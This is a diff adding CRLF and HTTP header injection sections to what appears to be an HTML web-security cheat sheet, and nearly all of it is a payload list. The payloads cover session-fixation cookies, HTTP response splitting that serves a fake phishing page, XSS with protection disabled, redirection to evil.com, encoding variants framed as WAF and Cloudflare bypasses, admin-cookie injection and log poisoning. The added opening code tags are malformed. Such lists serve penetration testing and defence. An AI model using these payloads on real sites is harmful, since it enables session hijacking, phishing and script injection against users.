@@ -165,6 +165,80 @@ ffuf -u "https://target.com/redirect?url=FUZZ" \
 # Payload list: all variants from the list above
 # Match condition: response contains new header or XSS indicator</code></pre>
 
+  <h2>CRLF Injection Payloads</h2>
+  <p>Extended payload variants from PayloadsAllTheThings including all encoding combinations.</p>
+
+  <h3>Session Fixation Payloads</h3>
+  <pre><code"># Inject Set-Cookie header via CRLF in any reflected parameter:
+%0d%0aSet-Cookie:sessionid=attacker_value
+%0aSet-Cookie:sessionid=attacker_value
+
+# Classic HTTP response splitting — two-response injection:
+?lang=en%0D%0AContent-Length:%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type:%20text/html%0ALast-Modified:%20Mon,%2027%20Oct%202060%2014:50:18%20GMT%0AContent-Length:%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
+
+# XSS via CRLF + disable XSS-Protection:
+http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a&lt;svg%20onload=alert(document.domain)&gt;%0d%0a0%0d%0a/%2f%2e%2e</code></pre>
+
+  <h3>Open Redirect via CRLF</h3>
+  <pre><code"># Inject Location header to redirect the browser:
+%0d%0aLocation:%20https://evil.com
+%0aLocation:%20https://evil.com
+
+# Combine with XSS:
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
+
+  <h2>Header Injection Techniques</h2>
+  <p>Additional injection variants and WAF bypass techniques from PayloadsAllTheThings.</p>
+
+  <h3>All Encoding Variants</h3>
+  <pre><code"># Standard:
+%0d%0aHeader:value
+%0aHeader:value
+%0dHeader:value
+
+# URL double-encoding:
+%250aHeader:value
+%25250aHeader:value
+%25%30aHeader:value
+%25%30%61Header:value
+
+# Hash/question mark prefix (WAF bypass):
+/%23%0aHeader:value
+/%23%0d%0aHeader:value
+/%3f%0aHeader:value
+/%3f%0dHeader:value
+
+# Unicode:
+/%u000aHeader:value
+
+# Double-encoded with path tricks:
+/%%0a0aHeader:value
+/%2e%2e%2f%0d%0aHeader:value
+/%2F..%0d%0aHeader:value
+
+# CSRF token injection:
+/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
+
+# Cloudflare bypass (split across newlines):
+&lt;iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)"&gt;</code></pre>
+
+  <h3>Injection in Different Header Positions</h3>
+  <pre><code"># Redirect parameter (most common):
+https://target.com/redirect?url=https://target.com%0d%0aSet-Cookie:injected=value
+
+# Cookie value injection:
+POST /preferences
+body: lang=en%0d%0aSet-Cookie:admin=true
+
+# Location header from user input:
+GET /login?next=https://target.com%0d%0aSet-Cookie:session=attacker_session
+
+# Custom response header from user data:
+GET /api/response?header=X-Custom%0d%0aInjected:value
+
+# Log injection → log poisoning (inject fake log entries):
+GET /login?user=admin%0aERROR: login bypass achieved for admin@target.com</code></pre>
+
   <h2>Resources</h2>
   <ul>
     <li>crlfuzz — fast CRLF scanner — <code>github.com/dwisiswant0/crlfuzz</code></li>
